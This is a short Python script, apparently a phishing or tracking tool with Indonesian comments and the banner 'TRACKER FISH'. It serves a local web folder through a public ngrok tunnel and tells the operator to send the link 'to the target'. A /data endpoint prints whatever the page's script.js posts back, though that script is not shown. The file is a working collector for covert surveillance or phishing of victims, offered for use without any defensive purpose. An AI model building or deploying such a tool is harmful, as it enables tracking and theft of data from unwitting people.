# tracker.py
import http.server
import socketserver
import os
import time
from pyngrok import ngrok

PORT = 8080

# Direktori server
web_dir = os.path.join(os.path.dirname(__file__), 'server')
os.chdir(web_dir)

# Custom handler untuk tangani POST dari script.js
class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/data':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            print("\n[📡 Data Diterima!]")
            print(post_data.decode('utf-8'))
            self.send_response(200)
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

print("\n=========================")
print("     TRACKER FISH ")
print("  By: Peju 3ncer 🗥️")
print("=========================")
input("\nKetik 'MASUK' untuk mulai: ")

# Tunneling dengan ngrok
public_url = ngrok.connect(PORT)
print("\nKirim link ini ke target:")
print(public_url)
print("\nMenunggu target...\n")

# Jalankan server dengan CustomHandler
httpd = socketserver.TCPServer(("", PORT), CustomHandler)
try:
    httpd.serve_forever()
except KeyboardInterrupt:
    print("\n\n[!] Dihentikan oleh user")
    httpd.shutdown()
    ngrok.kill()